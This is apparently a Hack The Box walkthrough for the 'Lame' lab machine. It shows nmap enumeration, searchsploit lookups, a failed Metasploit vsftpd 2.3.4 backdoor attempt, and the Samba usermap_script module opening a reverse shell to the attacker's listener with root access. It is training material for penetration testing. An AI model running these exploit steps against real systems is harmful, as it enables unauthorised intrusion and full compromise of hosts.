---
author: bhero
topic: htb
---
Walkthrough for Lame: 10.10.10.3

## Enumeration

first we assign the ip address to a local variable:

``` bash
LAME=10.10.10.3
```

First we run the nmap scan to identify the running services:

``` bash
nmap $LAME
```
this returns an error:

```
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
```

We know the service is up, lets avoid using the ping

```
nmap $LAME -Pn
```

Thats better now we get an output:

```
Nmap scan report for 10.10.10.3
Host is up (0.040s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Lets kick it up an notch and go into aggresive mode:

``` bash
nmap $LAME -Pn -p 21,22,139,445 -A
```
gives us more verbose reading

```
Nmap scan report for 10.10.10.3
Host is up (0.039s latency).

PORT    STATE    SERVICE     VERSION
21/tcp  open     ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.23
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open     ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open     netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2d22h58m12s, deviation: 0s, median: -2d22h58m12s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-09-13T12:14:55-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

```
Immediately there are a few things that stand out, the samba version looks like it might be promising:

``` bash
searchsploit samba 3.0
```

there are a few exploits that we can try:

```
----------------------------------------
 Exploit Title                                                  |  Path
                                                                | (/usr/share/exploitdb/)
---------------------------------------------------------------- ----------------------------------------
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasp | exploits/osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass          | exploits/multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execu | exploits/unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasplo | exploits/linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Meta | exploits/linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Me | exploits/solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow        | exploits/linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (Po | exploits/multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                | exploits/linux/remote/364.pl
Samba < 3.0.20 - Remote Heap Overflow                           | exploits/linux/remote/7701.txt
---------------------------------------------------------------- ----------------------------------------
```

But there is also potential with the ftp server:

``` bash
searchsploit vsftpd 2.3.4
```

give us:

```
---------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                  |  Path
                                                                | (/usr/share/exploitdb/)
---------------------------------------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)          | exploits/unix/remote/17491.rb
---------------------------------------------------------------- ----------------------------------------
```

A searchsploit check on the OpenSSH service doesn't yeild anything promising yet:

``` bash
searchsploit OpenSSH 4.
```

Returns:

```
---------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                  |  Path
                                                                | (/usr/share/exploitdb/)
---------------------------------------------------------------- ----------------------------------------
Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escal | exploits/linux/remote/6094.txt
OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One               | exploits/unix/remote/21314.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service      | exploits/multiple/dos/2444.sh
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack            | exploits/multiple/remote/3303.sh
---------------------------------------------------------------- ----------------------------------------
```

## Triage

A quick look into the services and we potentially have 2 services that are vulnerable to remote code execution.

Most interesting is th vftpd service as we have remote code exectin via a delliberate backdoor.

After reading the exploit code I was able to pull out this [article](http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
) which explains that if we send a connection to ftp with a :) in the username it should spawn a backdoor shell on port 6200.

Lets check the port first

``` bash
nmap $LAME -p 6200 -Pn
```

looks like it is inactive:

```
Nmap scan report for 10.10.10.3
Host is up.

PORT     STATE    SERVICE
6200/tcp filtered lm-x
```

At this point I could try to recreate the exploit manully as a PoC, but the ping scan restriction makes me think there maybe something a little sinester about the the box, lets try the msf exploit in searchsploit:

``` bash
msfconsole
```
lets look for the exploit:

``` ruby
search search vsftpd_234_backdoor
```

gives us:

```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

lets select it and configure the options

``` ruby
use exploit/unix/ftp/vsftpd_234_backdoor
show options
```

gives us only we need to configure:

```
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

leaving the target port as 21 all we need to do it specify the target host, set verbosity to true and run:

``` ruby
set RHOSTS 10.10.10.3
set VERBOSE TRUE
run
```

this fails:

``` ruby
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

Ok so what went wrong? Remember the nmap scan on port 6200?

```
Nmap scan report for 10.10.10.3
Host is up.

PORT     STATE    SERVICE
6200/tcp filtered lm-x
```

Looks like the connection is filtered! This means we might be blocked on this port.
I think that the exploit code probrably worked, but but the admin of the box may has made it so that no sevices can stand up on port 6200.

Ok lets revisit Samba:

``` ruby
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set VERBOSE TRUE
run
```

pops a shell:

``` 
[*] Started reverse TCP double handler on 10.10.14.23:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo LQByr8MPJ3zhSZdr;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "LQByr8MPJ3zhSZdr\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.23:4444 -> 10.10.10.3:54077) at 2019-09-16 21:16:51 +0100
```

lets check our privs:

``` sh
id
```

and we're root, W00tW00t!

```
uid=0(root) gid=0(root)
```

Grab the flags and submit.